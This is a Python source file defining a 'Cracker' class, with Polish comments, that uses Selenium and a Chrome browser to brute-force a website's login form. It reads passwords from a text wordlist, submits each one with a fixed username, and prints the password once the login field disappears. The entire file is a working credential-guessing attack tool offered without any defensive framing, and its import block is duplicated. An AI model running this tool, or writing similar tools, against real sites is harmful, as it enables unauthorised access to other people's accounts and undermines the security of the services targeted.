from selenium.webdriver.chrome import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC

class Cracker:
    def __init__(self, password_path, user_login, url):
        self.password_from_list = self.read_list_from_file(password_path)
        self.user_login = user_login
        self.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
        self.driver.get(url)

    def login(self, user_space, password_space, cssclick):
        """Nazwa na stronie z CSS"""
        for password in self.password_from_list:

            self.driver.find_element(by=By.NAME, value=user_space).send_keys(self.user_login)
            self.driver.find_element(by=By.NAME, value=password_space).send_keys(password)
            self.driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
            try:  # obsługa błedów
                WebDriverWait(self.driver, 2).until(EC.presence_of_element_located((By.NAME, user_space)))
            except:
                print("Correct password is ==> " + password + " <==")

    def read_list_from_file(self, filename):
        file_handler = open(filename + ".txt", "r")
        read_list = file_handler.readlines()
        file_handler.close()
        return read_list
